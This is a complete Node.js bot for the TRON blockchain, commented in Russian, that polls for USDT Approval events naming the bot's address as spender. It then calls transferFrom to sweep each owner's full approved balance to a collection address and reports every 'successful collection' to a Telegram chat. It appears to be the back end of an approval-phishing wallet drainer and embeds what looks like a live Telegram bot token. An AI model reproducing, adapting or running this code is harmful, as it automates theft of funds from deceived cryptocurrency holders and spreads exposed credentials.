const TronWeb = require('tronweb');
const dotenv = require('dotenv');
dotenv.config();

// --- Инициализация ---
const tronWeb = new TronWeb(
    process.env.TRONGRID_API,
    process.env.TRONGRID_API,
    process.env.TRONGRID_API,
    process.env.BOT_PRIVATE_KEY
);

const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
const BOT_ADDRESS = tronWeb.defaultAddress.base58;

// --- Telegram ---
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let processedTxs = new Set();
let stats = { totalCollected: 0, totalTransactions: 0 };

console.log('\n🤖 БОТ ЗАПУЩЕН');
console.log('📍 Адрес бота:', BOT_ADDRESS);
console.log('💰 Сбор USDT на:', COLLECTION_ADDRESS);
console.log('=================================\n');

async function sendTelegramMessage(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' })
        });
    } catch (error) {
        console.error('❌ Ошибка Telegram:', error.message);
    }
}

// Отправка стартового сообщения
(async () => {
    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
    await sendTelegramMessage(`
🚀 <b>Бот запущен</b>
📍 Адрес: <code>${BOT_ADDRESS}</code>
💰 Сбор на: <code>${COLLECTION_ADDRESS}</code>
💎 Баланс: ${tronWeb.fromSun(balance)} TRX
    `);
})();

// Поиск новых approve
async function getNewApprovals() {
    try {
        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
        const url = `https://api.trongrid.io/v1/contracts/${TOKEN_CONTRACT}/events?event_name=Approval&limit=100&min_block_timestamp=${oneDayAgo}`;
        const response = await fetch(url);
        const data = await response.json();
        if (!data.data) return [];

        return data.data.filter(event => {
            const spender = tronWeb.address.fromHex(event.result.spender);
            return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
        });
    } catch (error) {
        return [];
    }
}

// Обработка approve
async function processApproval(event) {
    const owner = tronWeb.address.fromHex(event.result.owner);
    const value = event.result.value;
    const valueUSDT = (value / 1_000_000).toFixed(2);
    const txId = event.transaction_id;

    if (processedTxs.has(txId)) return;

    console.log(`\n✅ Найден approve от ${owner.slice(0,8)}... на ${valueUSDT} USDT`);

    try {
        const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
        
        // Проверяем баланс отправителя
        const balance = await contract.balanceOf(owner).call();
        if (balance < value) {
            console.log('   ⚠️ Недостаточно USDT');
            processedTxs.add(txId);
            return;
        }

        // Проверяем баланс бота
        const botBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const botBalanceTRX = tronWeb.fromSun(botBalance);

        if (botBalanceTRX < 20) {
            console.log('   ⚠️ Мало TRX у бота');
            await sendTelegramMessage(`⚠️ Мало TRX у бота: ${botBalanceTRX} TRX`);
            return;
        }

        // Выполняем перевод
        const tx = await contract.transferFrom(owner, COLLECTION_ADDRESS, value).send({
            feeLimit: 1_000_000_000,
            callValue: 0
        });

        const newBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const feeSpent = (botBalance - newBalance) / 1_000_000;

        stats.totalCollected += parseFloat(valueUSDT);
        stats.totalTransactions++;

        await sendTelegramMessage(`
🚀 <b>УСПЕШНЫЙ СБОР!</b>
💰 Сумма: ${valueUSDT} USDT
📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
⚡️ Комиссия: ${feeSpent.toFixed(2)} TRX
🔗 https://tronscan.org/#/transaction/${tx}
        `);

        processedTxs.add(txId);

    } catch (error) {
        console.error(`❌ Ошибка:`, error.message);
        await sendTelegramMessage(`❌ Ошибка: ${error.message}`);
    }
}

// Основной цикл
async function checkAndSweep() {
    console.log(`\n🔍 [${new Date().toLocaleTimeString()}] Поиск approve...`);
    const approvals = await getNewApprovals();
    if (approvals.length === 0) {
        console.log('⏳ Новых approve нет');
        return;
    }
    console.log(`🎯 Найдено: ${approvals.length}`);
    for (const app of approvals) {
        await processApproval(app);
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// Запуск
checkAndSweep();
setInterval(checkAndSweep, 30000);

// Остановка
process.on('SIGINT', async () => {
    console.log('\n👋 Остановка...');
    await sendTelegramMessage(`
🛑 <b>Бот остановлен</b>
💰 Собрано: ${stats.totalCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.totalTransactions}
    `);
    process.exit(0);
});
